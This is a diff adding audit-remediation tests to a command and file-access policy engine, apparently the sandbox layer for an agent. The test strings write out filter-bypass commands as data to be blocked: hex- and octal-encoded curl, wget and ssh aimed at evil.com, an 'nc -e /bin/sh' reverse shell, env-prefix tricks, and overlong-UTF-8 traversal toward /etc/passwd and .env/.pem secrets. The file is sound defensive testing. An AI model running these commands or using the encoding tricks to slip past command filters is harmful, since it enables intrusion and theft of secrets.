@@ -782,9 +782,15 @@ class TestTL4AllowedCommands:
         assert r.status == PolicyResult.ALLOWED
 
     # System info (read-only)
-    def test_env(self, engine_tl4: PolicyEngine):
-        r = engine_tl4.check_command("env")
+    def test_printenv(self, engine_tl4: PolicyEngine):
+        """Audit #2: env replaced with printenv (env can prefix arbitrary commands)."""
+        r = engine_tl4.check_command("printenv")
         assert r.status == PolicyResult.ALLOWED
+
+    def test_env_bare_blocked(self, engine_tl4: PolicyEngine):
+        """Audit #2: bare env no longer allowed — use printenv instead."""
+        r = engine_tl4.check_command("env")
+        assert r.status == PolicyResult.BLOCKED
 
     def test_which(self, engine_tl4: PolicyEngine):
         r = engine_tl4.check_command("which python3")
@@ -1004,3 +1010,207 @@ class TestCompoundCommandValidation:
         """Path constraint should apply to piped commands too."""
         r = engine_tl4.check_command("cat /etc/passwd | grep root")
         assert r.status == PolicyResult.BLOCKED
+
+
+# ── Audit remediation tests ───────────────────────────────────────
+
+
+class TestAnsiCQuotingBypass:
+    """Audit #1: ANSI-C quoting ($'\\xNN', $'\\NNN') must be decoded before
+    blocked pattern matching. Defence-in-depth: sandbox provides network
+    isolation at TL2+, but the policy engine should catch these at its layer."""
+
+    def test_hex_encoded_curl_blocked(self, engine_tl4: PolicyEngine):
+        """$'\\x63\\x75\\x72\\x6c' decodes to 'curl' — must be blocked."""
+        r = engine_tl4.check_command("bash $'\\x63\\x75\\x72\\x6c' http://evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_octal_encoded_wget_blocked(self, engine_tl4: PolicyEngine):
+        """$'\\167\\147\\145\\164' decodes to 'wget' — must be blocked."""
+        r = engine_tl4.check_command("bash $'\\167\\147\\145\\164' http://evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_hex_encoded_nc_blocked(self, engine_tl4: PolicyEngine):
+        """$'\\x6e\\x63' decodes to 'nc' — must be blocked."""
+        r = engine_tl4.check_command("$'\\x6e\\x63' -e /bin/sh evil.com 4444")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_hex_encoded_ssh_blocked(self, engine_tl4: PolicyEngine):
+        """$'\\x73\\x73\\x68' decodes to 'ssh' — must be blocked."""
+        r = engine_tl4.check_command("$'\\x73\\x73\\x68' root@evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_here_string_with_encoded_curl_blocked(self, engine_tl4: PolicyEngine):
+        """bash <<< $'\\x63\\x75\\x72\\x6c evil.com' — the full attack from the audit."""
+        r = engine_tl4.check_command("bash <<< $'\\x63\\x75\\x72\\x6c evil.com'")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_mixed_literal_and_encoded_blocked(self, engine_tl4: PolicyEngine):
+        """Mixing literal and hex-encoded chars: $'cu\\x72l' = curl."""
+        r = engine_tl4.check_command("$'cu\\x72l' http://evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_normal_single_quotes_not_affected(self, engine_tl4: PolicyEngine):
+        """Normal single-quoted strings (no $ prefix) must not be altered."""
+        r = engine_tl4.check_command("echo 'hello world'")
+        assert r.status == PolicyResult.ALLOWED
+
+    def test_dollar_sign_in_normal_context_ok(self, engine_tl4: PolicyEngine):
+        """$VAR references should not be decoded as ANSI-C."""
+        r = engine_tl4.check_command("echo $HOME")
+        assert r.status == PolicyResult.ALLOWED
+
+    def test_ansi_c_with_allowed_content_ok(self, engine_tl4: PolicyEngine):
+        """ANSI-C quoting containing non-blocked content should pass."""
+        r = engine_tl4.check_command("echo $'\\x68\\x65\\x6c\\x6c\\x6f'")
+        assert r.status == PolicyResult.ALLOWED
+
+
+class TestEnvCommandPrefix:
+    """Audit #2: env removed from allowed list, replaced with printenv.
+    Defence-in-depth: _resolve_command_prefix strips env prefix so the
+    inner command is validated against the allowed list."""
+
+    def test_env_curl_blocked(self, engine_tl4: PolicyEngine):
+        """env curl evil.com — curl caught by blocked pattern on full string."""
+        r = engine_tl4.check_command("env curl evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_env_with_var_assignment_blocked(self, engine_tl4: PolicyEngine):
+        """env FOO=bar curl evil.com — prefix resolver skips VAR=val, finds curl."""
+        r = engine_tl4.check_command("env FOO=bar curl evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_env_with_allowed_command(self, engine_tl4: PolicyEngine):
+        """env ls /workspace — ls is allowed, so this should pass."""
+        r = engine_tl4.check_command("env ls /workspace")
+        assert r.status == PolicyResult.ALLOWED
+
+    def test_env_with_unknown_command(self, engine_tl4: PolicyEngine):
+        """env malicious_tool — not in allowed list, must be blocked."""
+        r = engine_tl4.check_command("env malicious_tool --pwn")
+        assert r.status == PolicyResult.BLOCKED
+        assert "not in allowed list" in r.reason.lower()
+
+    def test_env_ansi_encoded_curl_blocked(self, engine_tl4: PolicyEngine):
+        """env $'\\x63\\x75\\x72\\x6c' evil.com — combination of #1 + #2."""
+        r = engine_tl4.check_command("env $'\\x63\\x75\\x72\\x6c' evil.com")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_printenv_allowed(self, engine_tl4: PolicyEngine):
+        """printenv is the replacement for env — must be allowed."""
+        r = engine_tl4.check_command("printenv")
+        assert r.status == PolicyResult.ALLOWED
+
+    def test_printenv_with_var(self, engine_tl4: PolicyEngine):
+        """printenv HOME — read-only, should be allowed."""
+        r = engine_tl4.check_command("printenv HOME")
+        assert r.status == PolicyResult.ALLOWED
+
+
+class TestPolicyYamlValidation:
+    """Audit #3: bad policy files should produce clear errors, not raw tracebacks."""
+
+    def test_missing_policy_file(self, tmp_path):
+        """Non-existent policy file raises ValueError with clear message."""
+        with pytest.raises(ValueError, match="Policy file not found"):
+            PolicyEngine(str(tmp_path / "nonexistent.yaml"))
+
+    def test_malformed_yaml(self, tmp_path):
+        """Invalid YAML raises ValueError with clear message."""
+        bad = tmp_path / "bad.yaml"
+        bad.write_text("{{{{not yaml")
+        with pytest.raises(ValueError, match="not valid YAML"):
+            PolicyEngine(str(bad))
+
+    def test_non_dict_yaml(self, tmp_path):
+        """YAML that's a list instead of a dict raises ValueError."""
+        bad = tmp_path / "list.yaml"
+        bad.write_text("- item1\n- item2")
+        with pytest.raises(ValueError, match="YAML mapping"):
+            PolicyEngine(str(bad))
+
+    def test_network_non_string_domains(self, tmp_path):
+        """Audit #16: non-string entries in http_tool_allowed_domains caught at init."""
+        policy = tmp_path / "policy.yaml"
+        policy.write_text(
+            "file_access:\n"
+            "  write_allowed: []\n"
+            "  read_allowed: []\n"
+            "  blocked: []\n"
+            "commands:\n"
+            "  allowed: []\n"
+            "  blocked_patterns: []\n"
+            "  path_constrained: []\n"
+            "network:\n"
+            "  http_tool_allowed_domains:\n"
+            "    - 123\n"
+        )
+        with pytest.raises(ValueError, match="must be a string"):
+            PolicyEngine(str(policy))
+
+
+class TestOverlongUtf8Traversal:
+    """Audit #7: overlong UTF-8 encoding of '.' (%c0%ae) must be detected."""
+
+    def test_overlong_utf8_dot_write(self, engine: PolicyEngine):
+        """%c0%ae%c0%ae = overlong '..' — must trigger traversal detection."""
+        r = engine.check_file_write("/workspace/%c0%ae%c0%ae/etc/passwd")
+        assert r.status == PolicyResult.BLOCKED
+        assert "traversal" in r.reason.lower()
+
+    def test_overlong_utf8_dot_read(self, engine: PolicyEngine):
+        r = engine.check_file_read("/workspace/%c0%ae%c0%ae/etc/passwd")
+        assert r.status == PolicyResult.BLOCKED
+        assert "traversal" in r.reason.lower()
+
+    def test_overlong_mixed_with_normal(self, engine: PolicyEngine):
+        """Mix of %c0%ae and normal .. should be caught."""
+        r = engine.check_file_write("/workspace/%c0%ae%c0%ae/../etc/passwd")
+        assert r.status == PolicyResult.BLOCKED
+
+
+class TestDeepEnvFileBlocked:
+    """Audit #10: **/*.env must block .env files in deeply nested subdirectories."""
+
+    def test_single_subdir_env_blocked(self, engine: PolicyEngine):
+        r = engine.check_file_write("/workspace/project/.env")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_deep_nested_env_blocked(self, engine: PolicyEngine):
+        """Deep path: /workspace/sub/deep/nested/config.env must be blocked."""
+        r = engine.check_file_write("/workspace/sub/deep/nested/config.env")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_deep_nested_key_blocked(self, engine: PolicyEngine):
+        """Same for .key files."""
+        r = engine.check_file_write("/workspace/sub/deep/server.key")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_deep_nested_pem_blocked(self, engine: PolicyEngine):
+        """Same for .pem files."""
+        r = engine.check_file_read("/workspace/sub/deep/cert.pem")
+        assert r.status == PolicyResult.BLOCKED
+
+    def test_workspace_root_env_blocked(self, engine: PolicyEngine):
+        """Root-level .env still blocked."""
+        r = engine.check_file_write("/workspace/.env")
+        assert r.status == PolicyResult.BLOCKED
+
+
+class TestPolicyPropertyImmutability:
+    """Audit #17: policy property returns a copy — mutations don't affect internals."""
+
+    def test_policy_mutation_does_not_affect_engine(self, engine: PolicyEngine):
+        """Mutating the returned dict must not modify the engine's internal state."""
+        policy = engine.policy
+        policy["commands"]["allowed"].append("curl")
+        # Re-fetch — should not contain curl
+        assert "curl" not in engine.policy["commands"]["allowed"]
+
+    def test_policy_returns_full_structure(self, engine: PolicyEngine):
+        """Verify the returned policy has the expected structure."""
+        policy = engine.policy
+        assert "file_access" in policy
+        assert "commands" in policy
+        assert "blocked_patterns" in policy["commands"]
